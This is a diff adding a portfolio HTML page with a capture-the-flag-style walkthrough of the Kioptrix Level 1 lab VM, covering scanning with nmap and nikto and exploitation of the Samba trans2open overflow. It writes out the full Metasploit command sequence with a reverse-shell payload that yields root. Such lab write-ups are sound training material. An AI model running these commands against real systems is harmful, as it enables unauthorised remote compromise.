@@ -1,1 +1,199 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Kioptrix Level 1 Walkthrough | Beatrice Mutunga</title>
+  <link rel="stylesheet" href="../style.css" />
+  <style>
+    /* Writeup-specific styling (keeps consistent with your site) */
+    .writeup {
+      max-width: 940px;
+      margin: 28px auto;
+      padding: 28px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
+      color: #c9d1d9;
+      line-height: 1.6;
+    }
+    .writeup header { display:flex; gap:16px; align-items:center; margin-bottom:18px; }
+    .writeup .avatar { width:72px; height:72px; border-radius:50%; border:3px solid #f5c542; object-fit:cover; }
+    .writeup h1 { margin:0; color: #fff; font-size: 1.6rem; }
+    .meta { color:#9aa5b1; font-size:0.95rem; margin-top:6px; }
+    .lead { color:#c9d1d9; margin-top:12px; }
+    .section-title { color:#f5c542; margin-top:20px; margin-bottom:8px; font-size:1.05rem; }
+    img.md-img { display:block; max-width:100%; border-radius:8px; margin:12px 0; border:1px solid rgba(255,255,255,0.04); }
+    pre { background:#071025; color:#d6deff; padding:14px; border-radius:8px; overflow:auto; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; }
+    code.inline { background:#071021; padding:4px 8px; border-radius:6px; color:#d6deff; font-size:0.95em; }
+    .back-link { display:inline-flex; align-items:center; gap:8px; color:#9aa5b1; text-decoration:none; margin-top:14px; }
+    ol, ul { margin-left:1.1rem; color:#c9d1d9; }
+    footer.writeup-foot { text-align:center; color:#8b949e; margin-top:22px; font-size:0.9rem; }
+  </style>
+</head>
+<body>
+  <div class="writeup">
+    <header>
+      <img class="avatar" src="../assets/img/profile.jpg" alt="Beatrice Mutunga">
+      <div>
+        <h1>Kioptrix Level 1 Walkthrough</h1>
+        <div class="meta">Walkthrough of Kioptrix Level 1 VM penetration test — reconnaissance, vulnerability ID, exploitation (Samba trans2open)</div>
+        <div class="meta">Posted Jan 9, 2025 · Updated Oct 5, 2025 · By <strong>Beatrice Mutheu Mutunga</strong> · 2 min read</div>
+      </div>
+    </header>
+
+    <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/kioptrix-1.jpg" alt="Kioptrix overview"></p>
+     
+    <p class="lead"><strong>Walkthrough of Kioptrix Level 1 VM penetration test, covering reconnaissance, vulnerability identification, and exploitation via Samba trans2open overflow.</strong></p>
+    <hr>
+
+    <section>
+      <h3 class="section-title">Introduction</h3>
+      <p>Kioptrix Level 1 is a beginner-friendly vulnerable virtual machine on VulnHub intended for practicing penetration-testing fundamentals. This walkthrough documents enumeration, vulnerability identification, and obtaining root access.</p>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/Kioptrix1.png" alt="Kioptrix overview"></p>
+    </section>
+
+    <section>
+      <h3 class="section-title">Reconnaissance</h3>
+      <h4>Network discovery</h4>
+      <p>Tools used: <code class="inline">netdiscover</code>, <code class="inline">arp-scan</code>.</p>
+      <ul>
+        <li>Target discovered at: <strong>192.168.56.110</strong>.</li>
+        <li>MAC address: <strong>08:00:27:39:c3:0d</strong> (VirtualBox)</li>
+      </ul>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/netdiscover.png" alt="network screenshot"></p>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/arp-scan.png" alt="netdiscover output"></p>
+      </section>
+
+    <section>
+      <h3 class="section-title">Port scanning</h3>
+      <p>Performed a full Nmap scan to enumerate services and detect the OS:</p>
+
+      <pre><code>nmap -sS -sV -O 192.168.56.110 -oN kioptrix.txt</code></pre>
+
+      <h4>Open ports (summary)</h4>
+      <ul>
+        <li>22/tcp — OpenSSH 2.9p2 (protocol 1.99)</li>
+        <li>80/tcp — Apache 1.3.20 (Red Hat Linux)</li>
+        <li>111/tcp — rpcbind</li>
+        <li>139/tcp — Samba (smbd)</li>
+        <li>443/tcp — Apache/SSL</li>
+        <li>32768/tcp — status</li>
+      </ul>
+
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/nmap-scan1.png"></p>
+    </section>
+
+    <section>
+      <h3 class="section-title">Vulnerability analysis</h3>
+
+      <h4>Web service enumeration</h4>
+      <p>Apache 1.3.20 with mod_ssl/2.8.4 and OpenSSL/0.9.6b — all significantly out of date. <code class="inline">nikto</code> flagged multiple issues:</p>
+      <ul>
+        <li>Outdated components</li>
+        <li>TRACE method enabled (possible XST)</li>
+        <li>Directory listings exposed</li>
+        <li>Indicators of a PHP file manager/backdoor</li>
+      </ul>
+
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/port-80observe.png" alt="nikto output"></p>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/source-page.png" alt="more nikto output"></p>
+
+      <pre><code># Example nikto command used
+nikto -h http://192.168.56.110
+</code></pre>
+
+      <h4>Samba service</h4>
+      <p>Samba reported as 2.2.x — this version is vulnerable to the <strong>trans2open</strong> buffer overflow (CVE-2003-0201), making it a high-priority target.</p>
+    </section>
+
+    <section>
+      <h3 class="section-title">Exploitation</h3>
+
+      <h4>Metasploit approach (trans2open)</h4>
+      <p>Used Metasploit to search and execute a Samba trans2open exploit:</p>
+
+      <pre><code>msfconsole
+search trans2open
+use exploit/linux/samba/trans2open
+set RHOSTS 192.168.56.110
+set payload linux/x86/shell_reverse_tcp
+set LHOST 192.168.56.102
+set LPORT 4444
+run
+</code></pre>
+
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/search-trans2open.png" alt="msfconsole exploit run"></p>
+
+      <p><strong>Result:</strong> The exploit successfully opened reverse shells (sessions observed on ports 32773–32776) and provided a root shell.</p>
+
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/exploit-options.png" alt="reverse shell output"></p>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/hosts-setup.png" alt="root shell screenshot"></p>
+    </section>
+
+    <section>
+      <h3 class="section-title">Post-exploitation</h3>
+      <p>After gaining a shell, verified root privileges and enumerated the system:</p>
+
+      <pre><code>whoami      # => root
+hostname    # => kioptrix.level1
+</code></pre>
+
+      <p>Found a congratulations message in the system mail for root:</p>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/locate-mail.png" alt="system mail screenshot"></p>
+
+      <p>Captured the flag and evidence:</p>
+      <p><img class="md-img" src="https://github.com/beatrice-mutunga/beatrice-mutunga.github.io/blob/main/assets/img/flag%20(1).png" alt="flag screenshot"></p>
+    </section>
+
+    <section>
+      <h3 class="section-title">Key findings</h3>
+      <h4>Critical vulnerabilities</h4>
+      <ul>
+        <li>Samba trans2open overflow — decisive exploit vector.</li>
+        <li>Outdated software stack — Apache 1.3.20, OpenSSL 0.9.6b.</li>
+        <li>Weak service configuration — TRACE enabled, directory listings, and exposed backdoor-like files.</li>
+      </ul>
+
+      <h4>Attack chain</h4>
+      <ol>
+        <li>Network discovery → identify target IP.</li>
+        <li>Port scanning → enumerate services.</li>
+        <li>Service enumeration → identify vulnerable Samba.</li>
+        <li>Exploitation → execute trans2open via Metasploit.</li>
+        <li>Reverse shell → root access.</li>
+      </ol>
+
+      <h4>Lessons learned</h4>
+      <ul>
+        <li>Regular patching and updates are critical — a single unpatched service can lead to full system compromise.</li>
+        <li>Legacy Samba versions are high-risk and have been exploited in the wild for years.</li>
+        <li>Comprehensive reconnaissance and automated tooling (Nmap, Nikto, Metasploit) speed up discovery and exploitation in CTF/lab environments.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h3 class="section-title">Conclusion</h3>
+      <p>Kioptrix Level 1 is an excellent introductory exercise demonstrating how one vulnerable service (Samba) can compromise an entire system. This walkthrough documented a Metasploit-based exploitation path; alternative manual exploitation or deeper post-exploitation enumeration are great follow-ups for learning.</p>
+      <p><em>Ethical note: Use these techniques only on systems you own or are authorized to test.</em></p>
+    </section>
+
+    <section>
+      <h3 class="section-title">References & Resources</h3>
+      <ul>
+        <li>Kioptrix VM (VulnHub)</li>
+        <li>Samba trans2open (CVE-2003-0201)</li>
+        <li>Metasploit Framework</li>
+        <li>Nmap, Nikto</li>
+      </ul>
+    </section>
+
+    <a class="back-link" href="../index.html">← Back to portfolio</a>
+
+    <footer class="writeup-foot">
+      © 2025 Beatrice Mutheu Mutunga • Writeup converted from Markdown
+    </footer>
+  </div>
+</body>
+</html>
 
